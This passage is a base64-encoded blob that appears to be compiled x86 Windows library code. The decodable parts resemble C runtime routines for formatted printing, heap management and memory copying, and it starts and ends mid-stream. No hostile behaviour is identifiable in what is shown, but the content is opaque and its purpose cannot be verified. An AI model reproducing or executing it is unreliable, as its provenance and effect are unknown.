HIHjgAAAAHQhg730+///AHUYjYWo+///UFb/NUxdARDoHfD//1n/0FlZZoO96Pv//2d1HIXbdRiNhaj7//9QVv81SF0BEOj37///Wf/QWVmAPi11EYGN+Pv//wABAABGibXw+///VukE/v//x4X0+///CAAAAImNuPv//+skg+hzD4Rn/P//K8cPhIr+//+D6AMPhckBAADHhbj7//8nAAAA9oX4+///gMeF6Pv//xAAAAAPhGr+//9qMFhmiYXI+///i4W4+///g8BRZomFyvv//4m93Pv//+lF/v//94X4+///ABAAAA+FRf7//4PDBPaF+Pv//yB0HPaF+Pv//0CJneT7//90Bg+/Q/zrBA+3Q/yZ6xf2hfj7//9Ai0P8dAOZ6wIz0omd5Pv///aF+Pv//0B0G4XSfxd8BIXAcxH32IPSAPfagY34+///AAEAAPeF+Pv//wCQAACL2ov4dQIz24O99Pv//wB9DMeF9Pv//wEAAADrGoOl+Pv///e4AAIAADmF9Pv//34GiYX0+///i8cLw3UGIYXc+///jbX7/f//i4X0+////430+///hcB/BovHC8N0LYuF6Pv//5lSUFNX6J5NAACDwTCD+TmJnZD7//+L+IvafgYDjbj7//+IDk7rvY2F+/3//yvGRveF+Pv//wACAACJhez7//+JtfD7//90WYXAdAeLzoA5MHRO/43w+///i43w+///xgEwQOs2hdt1C6EkXQEQiYXw+///i4Xw+///x4XY+///AQAAAOsJT2aDOAB0BkBAhf918yuF8Pv//9H4iYXs+///g73E+///AA+FZQEAAIuF+Pv//6hAdCupAAEAAHQEai3rDqgBdARqK+sGqAJ0FGogWGaJhcj7///Hhdz7//8BAAAAi53U+///i7Xs+///K94rndz7///2hfj7//8MdRf/tdD7//+NheD7//9TaiDokfX//4PEDP+13Pv//4u90Pv//42F4Pv//42NyPv//+iY9f//9oX4+///CFl0G/aF+Pv//wR1EldTajCNheD7///oT/X//4PEDIO92Pv//wB1dYX2fnGLvfD7//+Jtej7////jej7//+Nhaj7//9Qi4Wo+////7CsAAAAjYWc+///V1Do3UoAAIPEEImFkPv//4XAfin/tZz7//+LhdD7//+NteD7///ouvT//wO9kPv//4O96Pv//wBZf6brHION4Pv////rE4uN8Pv//1aNheD7///o4/T//1mDveD7//8AfCD2hfj7//8EdBf/tdD7//+NheD7//9TaiDolfT//4PEDIO9vPv//wB0E/+1vPv//+hB1v//g6W8+///AFmLtcD7//8PtwaJhej7//9mhcB0KouNpPv//4ud5Pv//4vQ6Zb1///oIdz//8cAFgAAADPAUFBQUFDpMvX//4C9tPv//wB0CouFsPv//4NgcP2LheD7//+LTfxfXjPNW+hpzf//ycONSQC3ZwAQmWUAEMtlABAoZgAQdWYAEIFmABDIZgAQ2GcAEIv/VYvsgex0BAAAoRxQARAzxYlF/FOLXRRWi3UIM8BX/3UQi30MjY20+///ibXE+///iZ3o+///iYWs+///iYX4+///iYXU+///iYX0+///iYXc+///iYWw+///iYXY+///6P3O//+F9nU16FTb///HABYAAAAzwFBQUFBQ6Nra//+DxBSAvcD7//8AdAqLhbz7//+DYHD9g8j/6c8KAAAz9jv+dRLoGdv//1ZWVlbHABYAAABW68UPtw+JteD7//+Jtez7//+Jtcz7//+Jtaj7//+JjeT7//9mO84PhHQKAABqAloD+jm14Pv//4m9oPv//w+MSAoAAI1B4GaD+Fh3Dw+3wQ+2gKAUARCD4A/rAjPAi7XM+///a8AJD7aEMMAUARBqCMHoBF6Jhcz7//87xg+EM////4P4Bw+H3QkAAP8khZB7ABAzwION9Pv///+JhaT7//+JhbD7//+JhdT7//+Jhdz7//+Jhfj7//+Jhdj7///psAkAAA+3wYPoIHRIg+gDdDQrxnQkK8J0FIPoAw+FhgkAAAm1+Pv//+mHCQAAg434+///BOl7CQAAg434+///AelvCQAAgY34+///gAAAAOlgCQAACZX4+///6VUJAABmg/kqdSuLA4PDBImd6Pv//4mF1Pv//4XAD402CQAAg434+///BPed1Pv//+kkCQAAi4XU+///a8AKD7fJjUQI0ImF1Pv//+kJCQAAg6X0+///AOn9CAAAZoP5KnUliwODwwSJnej7//+JhfT7//+FwA+N3ggAAION9Pv////p0ggAAIuF9Pv//2vACg+3yY1ECNCJhfT7///ptwgAAA+3wYP4SXRRg/hodECD+Gx0GIP4dw+FnAgAAIGN+Pv//wAIAADpjQgAAGaDP2x1EQP6gY34+///ABAAAOl2CAAAg434+///EOlqCAAAg434+///IOleCAAAD7cHZoP4NnUZZoN/AjR1EoPHBIGN+Pv//wCAAADpPAgAAGaD+DN1GWaDfwIydRKDxwSBpfj7////f///6R0IAABmg/hkD4QTCAAAZoP4aQ+ECQgAAGaD+G8PhP8HAABmg/h1D4T1BwAAZoP4eA+E6wcAAGaD+FgPhOEHAACDpcz7//8Ai4XE+///UY214Pv//8eF2Pv//wEAAADoUvD//1npuAcAAA+3wYP4ZA+PMAIAAA+EvQIAAIP4Uw+PGwEAAHR+g+hBdBArwnRZK8J0CCvCD4XsBQAAg8Egx4Wk+///AQAAAImN5Pv//4ON+Pv//0CDvfT7//8AjbX8+///uAACAACJtfD7//+Jhez7//8PjY0CAADHhfT7//8GAAAA6ekCAAD3hfj7//8wCAAAD4XJAAAAg434+///IOm9AAAA94X4+///MAgAAHUHg434+///IIu99Pv//4P//3UFv////3+DwwT2hfj7//8giZ3o+///i1v8iZ3w+///D4QFBQAAhdt1C6EgXQEQiYXw+///g6Xs+///AIu18Pv//4X/D44dBQAAigaEwA+EEwUAAI2NtPv//w+2wFFQ6F7L//9ZWYXAdAFGRv+F7Pv//zm97Pv//3zQ6egEAACD6FgPhPACAAArwg+ElQAAAIPoBw+E9f7//yvCD4XGBAAAD7cDg8MEM/ZG9oX4+///IIm12Pv//4md6Pv//4mFnPv//3RCiIXI+///jYW0+///UIuFtPv//8aFyfv//wD/sKwAAACNhcj7//9QjYX8+///UOicRAAAg8QQhcB9D4m1sPv//+sHZomF/Pv//42F/Pv//4mF8Pv//4m17Pv//+lCBAAAiwODwwSJnej7//+FwHQ6i0gEhcl0M/eF+Pv//wAIAAAPvwCJjfD7//90EpkrwseF2Pv//wEAAADp/QMAAIOl2Pv//wDp8wMAAKEgXQEQiYXw+///UOjoJQAAWencAwAAg/hwD4/2AQAAD4TeAQAAg/hlD4zKAwAAg/hnD47o/f//g/hpdG2D+G50JIP4bw+FrgMAAPaF+Pv//4CJteT7//90YYGN+Pv//wACAADrVYszg8MEiZ3o+///6JpDAACFwA+EVvr///aF+Pv//yB0DGaLheD7//9miQbrCIuF4Pv//4kGx4Ww+///AQAAAOnBBAAAg434+///QMeF5Pv//woAAAD3hfj7//8AgAAAD4SrAQAAA96LQ/iLU/zp5wEAAHUSZoP5Z3Vjx4X0+///AQAAAOtXOYX0+///fgaJhfT7//+BvfT7//+jAAAAfj2LvfT7//+Bx10BAABX6PEEAABZi43k+///iYWo+///hcB0EImF8Pv//4m97Pv//4vw6wrHhfT7//+jAAAAiwODwwiJhZT7//+LQ/yJhZj7//+NhbT7//9Q/7Wk+///D77B/7X0+///iZ3o+///UP+17Pv//42FlPv//1ZQ/zVAXQEQ6Kbk//9Z/9CLnfj7//+DxByB44AAAAB0IYO99Pv//wB1GI2FtPv//1BW/zVMXQEQ6Hbk//9Z/9BZWWaDveT7//9ndRyF23UYjYW0+///UFb/NUhdARDoUOT//1n/0FlZgD4tdRGBjfj7//8AAQAARom18Pv//1bpCP7//4m19Pv//8eFrPv//wcAAADrJIPocw+Eavz//yvCD4SK/v//g+gDD4XJAQAAx4Ws+///JwAAAPaF+Pv//4DHheT7//8QAAAAD4Rq/v//ajBYZomF0Pv//4uFrPv//4PAUWaJhdL7//+Jldz7///pRf7///eF+Pv//wAQAAAPhUX+//+DwwT2hfj7//8gdBz2hfj7//9AiZ3o+///dAYPv0P86wQPt0P8mesX9oX4+///QItD/HQDmesCM9KJnej7///2hfj7//9AdBuF0n8XfASFwHMR99iD0gD32oGN+Pv//wABAAD3hfj7//8AkAAAi9qL+HUCM9uDvfT7//8AfQzHhfT7//8BAAAA6xqDpfj7///3uAACAAA5hfT7//9+BomF9Pv//4vHC8N1BiGF3Pv//421+/3//4uF9Pv///+N9Pv//4XAfwaLxwvDdC2LheT7//+ZUlBTV+j3QQAAg8Ewg/k5iZ2Q+///i/iL2n4GA42s+///iA5O672Nhfv9//8rxkb3hfj7//8AAgAAiYXs+///ibXw+///dFmFwHQHi86AOTB0Tv+N8Pv//4uN8Pv//8YBMEDrNoXbdQuhJF0BEImF8Pv//4uF8Pv//8eF2Pv//wEAAADrCU9mgzgAdAYDwoX/dfMrhfD7///R+ImF7Pv//4O9sPv//wAPhWUBAACLhfj7//+oQHQrqQABAAB0BGot6w6oAXQEaivrBqgCdBRqIFhmiYXQ+///x4Xc+///AQAAAIud1Pv//4u17Pv//yveK53c+///9oX4+///DHUX/7XE+///jYXg+///U2og6Orp//+DxAz/tdz7//+LvcT7//+NheD7//+NjdD7///o8en///aF+Pv//whZdBv2hfj7//8EdRJXU2owjYXg+///6Kjp//+DxAyDvdj7//8AdXWF9n5xi73w+///ibXk+////43k+///jYW0+///UIuFtPv///+wrAAAAI2FnPv//1dQ6DY/AACDxBCJhZD7//+FwH4p/7Wc+///i4XE+///jbXg+///6BPp//8DvZD7//+DveT7//8AWX+m6xyDjeD7////6xOLjfD7//9WjYXg+///6Dzp//9Zg73g+///AHwg9oX4+///BHQX/7XE+///jYXg+///U2og6O7o//+DxAyDvaj7//8AdBP/taj7///omsr//4OlqPv//wBZi72g+///i53o+///D7cHM/aJheT7//9mO8Z0B4vI6aH1//85tcz7//90DYO9zPv//wcPhVD1//+AvcD7//8AdAqLhbz7//+DYHD9i4Xg+///i038X14zzVvoyMH//8nDi/9gcwAQWHEAEIpxABDlcQAQMXIAED1yABCDcgAQgnMAEIv/VYvsVlcz9v91COi5IAAAi/hZhf91JzkFaGMBEHYfVv8VsAABEI2G6AMAADsFaGMBEHYDg8j/i/CD+P91yovHX15dw4v/VYvsVlcz9moA/3UM/3UI6Io/AACL+IPEDIX/dSc5BWhjARB2H1b/FbAAARCNhugDAAA7BWhjARB2A4PI/4vwg/j/dcOLx19eXcOL/1WL7FZXM/b/dQz/dQjoXkAAAIv4WVmF/3UsOUUMdCc5BWhjARB2H1b/FbAAARCNhugDAAA7BWhjARB2A4PI/4vwg/j/dcGLx19eXcOL/1WL7Fe/6AMAAFf/FbAAARD/dQj/FZQAARCBx+gDAACB/2DqAAB3BIXAdN5fXcOL/1WL7OiwQwAA/3UI6P1BAAD/NRBYARDo/t7//2j/AAAA/9CDxAxdw4v/VYvsaBwDARD/FZQAARCFwHQVaAwDARBQ/xWYAAEQhcB0Bf91CP/QXcOL/1WL7P91COjI////Wf91CP8VtAABEMxq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